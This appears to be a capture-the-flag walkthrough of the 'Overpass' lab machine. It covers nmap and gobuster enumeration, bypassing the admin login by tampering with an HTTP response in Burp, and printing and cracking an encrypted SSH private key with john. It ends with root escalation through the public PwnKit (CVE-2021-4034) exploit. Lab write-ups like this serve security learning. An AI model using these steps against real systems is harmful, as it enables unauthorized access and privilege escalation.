1. nmap -sC -sV -A TARGET_IP -o nmap_overpass.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-19 14:35 IST
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 95.00% done; ETC: 14:35 (0:00:01 remaining)
Nmap scan report for 10.10.40.175
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.89 seconds


2. now tried to scan full ports (so that we can get more port informations and services)

nmap -v -n -p- 10.10.40.175 -o nmap_overpass_all_ports.txt

Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


3. using gobuster trying to enumerate
gobuster dir -u 10.10.40.175 -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 64 -o gobuster_overpass.txt

/img                  (Status: 301) [Size: 0] [--> img/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/admin                (Status: 301) [Size: 42] [--> /admin/]  
/css                  (Status: 301) [Size: 0] [--> css/]      
/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]  
/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]   
/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]

4. using burp tried to access /admin page, Ádministrator Logon' page appears. At this stage tried to use sql injection  but it failed!!!!.

5. while analyzing burp after setting scope to TARGET_IP and also set proxy for response. Got two javascript files. (i) main.js and (ii) cookie.js
in cookie.js , It is evident that the code checks 'Correct Credential' response. In Burp after incepting the response and modifying the response as Çorrect Credential' and SesstionToken as Correct Credential a redirect appears '/admin/'

after refreshing this page got ssh credential.

Welcome to the Overpass Administrator area
A secure password manager with support for Windows, Linux, MacOS and more
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----

6. So, we get the username as James and ssh's private key .
7. copy it in a text file named id_rsa.txt 
8. using john crack it with the help with rockyou.txt
(a) ssh2john.py id_rsa.txt > id_rsa.hash
(b) john --wordlist=rockyou.txt id_rsa.hash
(c) got the password: james13

8. Now create a directory named .ssh in attackbox
9. copy id_rsa.txt as id_rsa into .ssh directory
10. now move into .ssh directory.
11. ssh -i id_rsa james@TARGET_IP
provide the passphrase as : james13
12. logged in as james and get user.txt (user flag)
13. run sudo -l
** got sudo version: 1.8.21p2 **
It is vulnerable, but cannot exploit using it.
14. Now tried to list all suid bit set binary executables:-
find  / -perm -u=s -type f 2>/dev/null

/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/bin/ping
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

as pkexec's suid bit is set, it may be vulnerable to CVE-2021-4034
So, again this github exploit tried to exploit:

  https://github.com/PwnFunction/CVE-2021-4034

15. download files and transfer them to target.
16. in /tmp of TARGET
we require following files:
(a) pwnkit.c
(b) Makefile
(c) conversion-mod.c

17. make all && ./pwnkit && make clean
get the root shell and flag





